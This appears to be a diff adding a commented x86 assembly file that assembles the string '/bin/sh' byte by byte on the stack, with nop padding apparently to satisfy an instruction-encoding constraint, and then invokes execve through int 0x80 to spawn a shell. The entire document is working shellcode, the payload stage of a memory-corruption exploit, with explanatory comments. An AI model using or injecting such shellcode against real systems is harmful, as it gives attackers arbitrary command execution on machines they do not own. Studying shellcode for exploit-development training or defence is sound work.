@@ -1,0 +1,53 @@
+xor eax, eax                     #clears eax
+
+   push eax                         #push 0x00000000 on the stac
+   push eax                         #push 0x00000000 on the stack
+
+   mov edi, esp                     #sets the edi to the top of the stack so we can write something in edi and it will be written on the stack .
+
+   mov al, 0x2f                     #writes '/' on the lowes byte of the eax
+   add [edi], al                    #adds the '/' to the edi pointer which points to the first byte of the stack( top of the stack ($esp+0)) 
+                                    #first byte of the stack at this addr            0xffb82dac:     0x2f    
+   inc edi                          #increment the edi by 1 so the next addr is      0xffb82dad:     0x00   its empty as intended for now
+   nop                              #we need this nop because inc edi = 0x47 as hex instruction and we know we need always 2 bytes to keep the code stable
+
+   mov al, 0x62                     #writes 'b' on the lowes byte of the eax 2nd byte of the stack 
+   add [edi], al
+   inc edi
+   nop
+
+   mov al, 0x69                     #writes 'i' on the lowes byte of the eax 3rd byte of the stack
+   add [edi], al
+   inc edi
+   nop
+
+   mov al, 0x6e                      #writes 'n' on the lowes byte of the eax 4th
+   add [edi], al
+   inc edi
+   nop
+
+   mov al, 0x2f                      #writes '/' on the lowes byte of the eax 5th
+   add [edi], al
+   inc edi
+   nop
+
+   mov al, 0x73                      #writes 's' on the lowes byte of the eax 6th
+   add [edi], al
+   inc edi
+   nop
+
+   mov al, 0x68                      #writes 'h' on the lowes byte of the eax 7th
+   add [edi], al
+   inc edi
+   nop
+
+   xor ebx, ebx                       #clears ebx
+   xor ecx, ecx                       #clears ecx
+   xor edx, edx                        #clears edx
+
+   mov al, 0xb                         #writes 0xb to the lowest byte of the eax=0xb int(0xb)=11 that will be the argument for the int 0x80 it calls sys_execve
+   mov ebx, esp                        #Writes the /bin/sh string in the ebx the 2nd argument for the int 0x80 
+  
+
+
+   int 0x80
